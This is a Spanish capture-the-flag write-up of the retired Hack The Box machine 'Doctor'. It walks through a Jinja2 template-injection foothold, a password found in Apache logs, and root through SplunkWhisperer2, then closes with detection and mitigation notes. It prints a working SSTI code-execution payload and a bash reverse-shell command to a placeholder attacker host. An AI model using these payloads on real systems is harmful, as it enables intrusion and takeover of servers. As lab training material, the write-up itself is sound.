---
machine: Doctor
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, ssti, jinja2, vhost, splunk, splunkwhisperer2]
---

# Doctor — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (ref.), publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Portal médico con **virtual host** `doctors.htb`. El título de los mensajes se renderiza con Jinja2: **SSTI** que da shell como `web`. Ese usuario está en el grupo **`adm`**, así que lee `/var/log/apache2/backup`, donde quedó una contraseña en un correo de reseteo: `su shaun`. La misma contraseña abre **Splunk Web (8.0.5) en 8089**, y **SplunkWhisperer2** ejecuta como root porque `splunkd` corre como root.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp    ssh     OpenSSH 8.2p1 Ubuntu
80/tcp    http    Apache httpd 2.4.41
8089/tcp  ssl/http Splunkd
```

Por IP hay una página simple con un correo `info@doctors.htb`:

```bash
curl -s http://<IP>/ | grep -i doctor
echo "<IP> doctors.htb" | sudo tee -a /etc/hosts
```

En el vhost aparece un blog con registro y «New Message». El 8089 es la consola de gestión de Splunk 8.0.5, que pide autenticación básica.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

Se publica un mensaje con el título `{{7*7}}` y se visita `/archive` (el RSS evalúa el título; `/home` lo escapa):

```text
49
```

Confirmado Jinja2. Payload de ejecución:

```text
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

Se lanza una reverse shell y se obtiene `uid=1001(web)`, con el grupo `adm`:

```bash
id
# uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
```

## Movimiento lateral

`adm` da lectura de logs. Buscando contraseñas en ellos aparece el reseteo de `shaun`:

```bash
grep -ri "password" /var/log/apache2/ 2>/dev/null
cat /var/log/apache2/backup
```

```text
... /reset?email=shaun&password=Guitar123 ...
```

```bash
su shaun
cat ~/user.txt
```

## Escalada de privilegios

```bash
ps -ef | grep splunkd
# root  1141  1  ... splunkd -p 8089 start
```

`splunkd` corre como root y la contraseña de `shaun` está reutilizada en la consola de Splunk. Con esas credenciales se usa **SplunkWhisperer2**, que abusa del *universal forwarder* para ejecutar comandos:

```bash
git clone https://github.com/cnotin/SplunkWhisperer2
python3 SplunkWhisperer2/PySplunkWhisperer2/PySplunkWhisperer2_remote.py \
  --host <IP> --port 8089 --username shaun --password '<password>' \
  --payload "bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/443 0>&1'"
```

La shell vuelve como root y se lee `/root/root.txt`.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- Un SSTI en un campo que parece decorativo (el título de un post) es ejecución remota.
- `adm` es lectura de logs, y los logs guardan contraseñas que la gente escribe en formularios.
- Reutilizar la contraseña del sistema en una herramienta de monitorización es la escalada: Splunk ejecuta como el usuario que lo arranca.
- Detección: títulos con `{{` o `__globals__`, y procesos `splunkd` lanzando `bash` desde el forwarder.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
- No construir plantillas con entrada del usuario; usar sandbox y contexto restringido.

## Referencias

- [ssti](../../../knowledge/web/ssti.md)
